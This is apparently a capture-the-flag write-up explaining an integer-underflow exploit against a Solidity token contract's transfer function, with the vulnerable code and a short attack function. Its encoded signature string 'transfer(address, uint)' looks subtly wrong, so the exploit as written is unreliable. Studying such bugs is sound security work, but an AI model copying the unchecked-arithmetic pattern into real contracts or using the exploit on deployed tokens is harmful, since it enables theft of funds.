# Requirements

- Hack the basic token contract.
- Get more than 20 tokens.

# Attack explanation

This is an old one. Integers in Solidity < 0.8 overflow / underflow without any errors. We could use this in our favour to make a small value underflow and convert it into a large value. We can achieve this by playing a little bit with transfer function.

```
function transfer(address _to, uint _value) public returns (bool) {
  require(balances[msg.sender] - _value >= 0);
  balances[msg.sender] -= _value;
  balances[_to] += _value;
  return true;
}
```

We need to make our balance underflow. In this way, we will be able to extract a large amount of tokens from the contract, ideally, the total supply. This can be achieved by calculating type(uint256).max - totalSupply, or just sending totalSupply + 1.

# Attack function

We could solve the challenge by just using the following attack function:

```
function attack() public {
    vulnerableScAddress.call(
        abi.encodeWithSignature(
            "transfer(address, uint)",
            attacker,
            type(uint256).max - totalSupply // totalSupply + 1.
        )
    );
}
```
